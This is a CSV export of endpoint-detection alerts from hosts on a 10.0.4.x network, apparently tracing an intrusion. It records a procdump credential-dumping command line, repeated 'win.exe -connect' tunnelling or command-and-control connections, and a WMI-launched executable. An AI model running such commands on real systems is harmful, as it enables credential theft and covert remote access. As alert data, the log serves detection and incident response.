"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T14:47:36.854Z","10.0.4.44","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","""C:\Users\Bob\Desktop\keepass\procdump64.exe"" -accepteula -ma 6096","",
"2025-03-28T14:43:58.503Z","10.0.4.43","High","70","A process attempted to establish an unusual connection over a commonly used port, possibly to a command and control server. Adversaries can use this to bypass firewalls and evade detection. Review the process tree.","""C:\Users\backup\desktop\win.exe"" -connect 10.0.4.11:11602 -retry -ignore-cert","",
"2025-03-28T14:30:26.235Z","10.0.4.44","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\backup\desktop\win.exe"" -connect 10.0.4.43:11603 -retry -ignore-cert","",
"2025-03-28T14:27:04.629Z","10.0.4.43","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\backup\desktop\win.exe"" -connect 10.0.4.11:11602 -retry -ignore-cert","",
"2025-03-28T14:21:19.547Z","10.0.4.43","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\backup\desktop\win.exe"" -connect 10.0.4.11:11601 -retry -ignore-cert","",
"2025-03-28T14:19:24.774Z","10.0.4.44","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\backup\DEsktop\win.exe"" -connect 10.0.4.11:11601 -retry -ignore-cert","",
"2025-03-28T14:17:45.656Z","10.0.4.44","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\backup\Desktop\win.exe"" -connect 10.0.4.11:11601 -retry -ignore-cert","",
"2025-03-28T14:06:13.881Z","10.0.4.43","High","70","A process attempted to establish an unusual connection over a commonly used port, possibly to a command and control server. Adversaries can use this to bypass firewalls and evade detection. Review the process tree.","""C:\Users\backup\desktop\win.exe"" -connect 10.0.4.11:11601 -retry -ignore-cert","",
"2025-03-28T13:59:56.175Z","10.0.4.43","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\backup\desktop\win.exe"" -connect 10.0.4.11:11601 -retry -ignore-cert","",
"2025-03-28T13:56:39.656Z","10.0.4.11","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\helpdesk\Documents\win.exe"" -connect 10.0.4.30:11601 -retry -ignore-cert","",
"2025-03-28T13:52:50.776Z","10.0.4.11","High","70","Windows Management Instrumentation (WMI) launched an unexpected process. An adversary might be abusing WMI to carry out malicious commands. Review the process tree.","""C:\Users\helpdesk\Documents\m.exe""","",
"2025-03-28T13:52:50.776Z","10.0.4.11","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\helpdesk\Documents\m.exe""","",
"2025-03-28T13:52:44.892Z","10.0.4.11","High","70","A process launched that meets the cloud-based behavioral machine learning model  threshold for malicious activity. Detection is based on execution pattern and on-sensor ML telemetry.","""C:\Users\helpdesk\Documents\m.exe""","",
